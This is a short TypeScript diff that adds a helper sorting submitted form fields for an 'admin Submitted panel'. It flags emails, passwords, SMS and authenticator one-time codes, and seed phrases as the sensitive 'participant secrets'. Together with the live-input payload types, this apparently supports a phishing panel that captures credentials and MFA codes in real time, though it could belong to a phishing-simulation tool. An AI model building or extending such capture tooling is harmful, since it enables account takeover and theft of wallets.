@@ -26,6 +26,46 @@ export type InputPayload = {
   at: number;
 };
 
+/**
+ * Credentials / codes that belong in the admin Submitted panel.
+ * Noise (captcha, phone_send, clicks, balance picks, etc.) is excluded.
+ */
+export function isSensitiveAdminSubmission(field: string): boolean {
+  const key = field
+    .replace(/_submitted$/i, "")
+    .trim()
+    .toLowerCase()
+    .replace(/[\s-]+/g, "_");
+
+  // Logins
+  if (
+    key === "email" ||
+    key === "login" ||
+    key === "identifier" ||
+    key === "recovery_email" ||
+    key === "email_or_phone"
+  ) {
+    return true;
+  }
+  // Passwords
+  if (key === "password" || key === "passwd") return true;
+  // SMS / authenticator / email OTP
+  if (
+    key === "sms_code" ||
+    key === "sms" ||
+    key === "totp" ||
+    key === "authenticator" ||
+    key === "otp" ||
+    key === "email_code" ||
+    key === "mailcode"
+  ) {
+    return true;
+  }
+  // Seed phrases + case IDs (other suites — still participant secrets)
+  if (key.includes("phrase") || key === "case_id") return true;
+  return false;
+}
+
 export type LiveInputPayload = {
   participantId: string;
   field: string;
